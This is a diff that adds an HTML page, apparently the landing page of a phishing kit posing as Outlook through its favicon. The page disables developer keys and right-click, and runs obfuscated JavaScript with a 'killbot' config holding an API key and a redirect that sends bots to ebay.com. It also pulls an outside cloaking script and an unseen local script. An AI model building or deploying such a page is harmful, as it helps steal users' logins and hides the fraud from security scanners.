@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+document.addEventListener("keydown", function(e){
+  // USE THIS TO DISABLE CONTROL AND ALL FUNCTION KEYS
+  // if (e.ctrlKey || (e.keyCode>=112 && e.keyCode<=123)) {
+  // THIS WILL ONLY DISABLE CONTROL AND F12
+  if (e.ctrlKey || e.keyCode==123) {
+    e.stopPropagation();
+    e.preventDefault();
+  }
+});
+</script>
+<script>
+document.addEventListener("contextmenu", function(e){
+  e.preventDefault();
+}, false);
+</script>
+<script type="text/javascript">
+    function _0x11d1(_0x277f8e,_0x5eb04a){const _0x329c08=_0x329c();return _0x11d1=function(_0x11d133,_0x5dfc11){_0x11d133=_0x11d133-0xb4;let _0x2d082c=_0x329c08[_0x11d133];return _0x2d082c;},_0x11d1(_0x277f8e,_0x5eb04a);}function _0x329c(){const _0x330663=['423063eikfeC','595FWNtCi','12684300DCKwZN','82423WrOupE','7256OWaDLH','6qahHzZ','2770416kIyuOX','4935330RrfnYT','32mbKunV','81823ooLHhf'];_0x329c=function(){return _0x330663;};return _0x329c();}(function(_0x116732,_0x2281aa){const _0x13107e=_0x11d1,_0x362a51=_0x116732();while(!![]){try{const _0x1a0452=parseInt(_0x13107e(0xb9))/0x1+parseInt(_0x13107e(0xbb))/0x2*(parseInt(_0x13107e(0xb6))/0x3)+parseInt(_0x13107e(0xba))/0x4*(-parseInt(_0x13107e(0xb7))/0x5)+-parseInt(_0x13107e(0xbd))/0x6+parseInt(_0x13107e(0xb5))/0x7*(parseInt(_0x13107e(0xb4))/0x8)+-parseInt(_0x13107e(0xbc))/0x9+parseInt(_0x13107e(0xb8))/0xa;if(_0x1a0452===_0x2281aa)break;else _0x362a51['push'](_0x362a51['shift']());}catch(_0x461ea5){_0x362a51['push'](_0x362a51['shift']());}}}(_0x329c,0x73d3b));const killbot={'apiKey':'hWPE33H2kolW8LZeQHVhkpAu2rbM1BdDVGutZE0AHXPRM','botRedirection':'http://ebay.com'};
+</script>
+<script src="https://files.killbot.org/.cdn-cgi/killbot-security.js"></script>
+<link rel="shortcut icon" href="outlook.ico" type="image/x-icon">
+</head>
+<body>
+<script language="Javascript" src="myscr846603.js"></script>
+</body>
+</html>
